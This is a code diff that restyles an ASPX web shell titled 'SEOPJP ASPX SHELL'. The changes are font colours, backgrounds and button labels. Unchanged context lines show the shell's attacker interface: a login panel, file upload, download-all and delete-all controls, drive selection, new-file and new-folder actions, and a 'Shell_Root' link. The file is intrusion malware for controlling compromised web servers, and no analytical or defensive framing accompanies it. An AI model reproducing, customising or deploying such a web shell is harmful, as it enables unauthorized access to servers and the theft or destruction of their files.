@@ -12,7 +12,7 @@
 <%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
 <!DOCTYPE html>
 <center><img src="https://i.ibb.co/gS91kwL/1000015604-removebg-preview.png" width="275" height="275"><center>        
-<h1><font color=blue><font color=crimson><font color=aqua>S<font color=yellow>E<font color=deeppink>O<font color=teal>P<font color=silver>J<font color=silver>P <font color=red>ASPX <font color=white>SHELL<font color=crimson><font color=blue></h1>
+<h1><font color=white><font color=crimson><font color=aqua>S<font color=yellow>E<font color=deeppink>O<font color=teal>P<font color=silver>J<font color=silver>P <font color=red>ASPX <font color=white>SHELL<font color=crimson><font color=white></h1>
 
 
 <style type="text/css">
@@ -107,7 +107,7 @@ display:none
         td
         {
             padding: 2px;
-            background: grey;
+            background: black;
             border-top: 1px solid #fff;
             color: #669;
             
@@ -121,7 +121,7 @@ display:none
      th
     {
         padding: 2px;
-        color: blue;
+        color: white;
         background: black;
     }
                 
@@ -533,12 +533,12 @@ return QS.Get();
     {
         if (status == true)
         {
-            msgs.ForeColor = System.Drawing.Color.Green;
+            msgs.ForeColor = System.Drawing.Color.White;
             msgs.Text = "Sucess, " + msg;
         }
         else
         {
-            msgs.ForeColor = System.Drawing.Color.Red;
+            msgs.ForeColor = System.Drawing.Color.White;
             msgs.Text = "Error, " + msg;
         }
     }
@@ -1277,7 +1277,7 @@ return QS.Get();
             <asp:Button ID="Login_Button" runat="server" Text="LogIn" OnClick="Login_Button_Click" />              
         </asp:Panel> 
               <asp:LinkButton ID="Logout" Visible="false"   style=" float :right;" runat="server" OnClick="Logout_Click">
-                LOGOUT</asp:LinkButton>
+                <font color=white>LOGOUT</asp:LinkButton>
               <h3 >  </h3> 
            
          </div>
@@ -1321,25 +1321,25 @@ return QS.Get();
      <asp:Button ID="Upload" runat="server"  Text="Upload" OnClick="Upload_Click" />
         <br />
          <input type="checkbox" name="selectall" title="Select All Files" onclick="javascript: slctall();" />Select All Files To   
-        <a href="#" onclick="javascript:downloadall()">Download ALL</a> || 
-          <a href="#" onclick="javascript:deleteall()">Delete ALL</a>
+        <a href="#" onclick="javascript:downloadall()"><font color=white>|| Download ALL</a> || 
+          <a href="#" onclick="javascript:deleteall()"><font color=white>Delete ALL ||</a>
          <asp:HyperLink runat="server">Copy</asp:HyperLink>|<asp:HyperLink runat="server">Move</asp:HyperLink> 
       <br />
    
     </div>
                  
     <div  id="current" style="  height: 60px; width: 100%; border-style: inset">
-    <a href="javascript:Bin_PostBack('shell_root', '<%=  base64Encode("./")%>' )"')">Shell_Root</a> ||  Select Drivers:
+    <a href="javascript:Bin_PostBack('shell_root', '<%=  base64Encode("./")%>' )"')"><font color=white>Shell_Root</a> ||  Select Drivers:
         <asp:DropDownList ID="DriversList"  runat="server" style=" height: 21px;" Width="143px" OnSelectedIndexChanged="DriversList_SelectedIndexChanged" >
         </asp:DropDownList>
         <asp:Button ID="slctdrive" runat="server" EnableViewState="true"  Height="21px" OnClick="slctdrive_Click" Text="GET" Width="38px" />
-        || <a href="javascript:newfolder()">New Folder</a> || <a href="javascript:newfile()">New File</a> 
+        || <a href="javascript:newfolder()"><font color=white>New Folder</a> || <a href="javascript:newfile()"><font color=white>New File</a> 
         <br />
        
        <br />
        
         
-        Current Path:
+        Current Path: 
         <asp:Label ID="currentpathlabel" runat="server" EnableViewState="true"  Visible="False"></asp:Label>
    
         <asp:Literal ID="Literal1" runat="server"></asp:Literal>
@@ -1364,7 +1364,7 @@ return QS.Get();
                     </th>
                   
                     <th>
-                       TO DO
+                       Action
                     </th>
                 </tr>
             </thead>
